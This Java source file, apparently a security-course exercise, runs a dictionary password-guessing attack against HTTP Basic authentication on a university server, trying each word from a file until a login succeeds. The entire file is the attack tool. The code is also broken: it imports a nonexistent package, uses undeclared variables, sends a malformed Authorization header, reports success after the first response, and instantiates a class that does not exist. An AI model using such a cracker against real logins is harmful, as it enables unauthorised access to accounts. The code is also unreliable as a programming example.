

import java.io.*;
import java.net.*;
import java.misc.BASE64Encoder;

public class Dictionary
{
  public Dictionary()
  {}

  public boolean fetchURL(String urlString,String username,String password)
  {
     StringWriter  sw= new StringWriter();
     PrintWriter  pw = new PrintWriter();
     try{
       URL url=new URL(urlString);  
       String userPwd= username+":"+password;

       
       
       
       

       BASE64Encoder encoder = new BASE64Encoder();
       String encodedStr = encoder.encode (userPwd.getBytes());
       System.out.println("Original String = " + userPwd);
	 System.out.println("Encoded String = " + encodedStr);

       HttpURLConnection huc=(HttpURLConnection) url.openConnection();  
       huc.setRequestProperty( "Authorization"," "+encodedStr);   
       InputStream content = (InputStream)huc.getInputStream();
       BufferedReader in   =
       new BufferedReader (new InputStreamReader (content));
       String line;
       while ((line = in.readLine()) != null) {
         pw.println (line);
       System.out.println("");
       System.out.println(sw.toString());
       }return true;
     } catch (MalformedURLException e) {
       pw.println ("Invalid URL");
       return false;
     } catch (IOException e) {
       pw.println ("Error  URL");
       return false;
     }

  }

  public void getPassword()
  {
     String dictionary="words";
     String urlString="http://sec-crack.cs.rmit.edu./SEC/2/";
     String login="";
     String pwd=" ";

     try
     {
       BufferedReader inputStream=new BufferedReader(new FileReader(dictionary));
        startTime=System.currentTimeMillis();
       while (pwd!=null)
       {
         pwd=inputStream.readLine();
         if(this.fetchURL(urlString,login,pwd))
         {
            finishTime=System.currentTimeMillis();
           System.out.println("Finally I gotta it,  password is : "+pwd);
           System.out.println("The time for cracking password is: "+(finishTime-startTime) + " milliseconds");
           System.exit(1);
         } 

       }
       inputStream.close();
     }
     catch(FileNotFoundException e)
     {
       System.out.println("Dictionary not found.");
     }
     catch(IOException e)
     {
       System.out.println("Error  dictionary");
     }
  }

  public static void main(String[] arguments)
  {
     BruteForce bf=new BruteForce();
     bf.getPassword();
  } 
}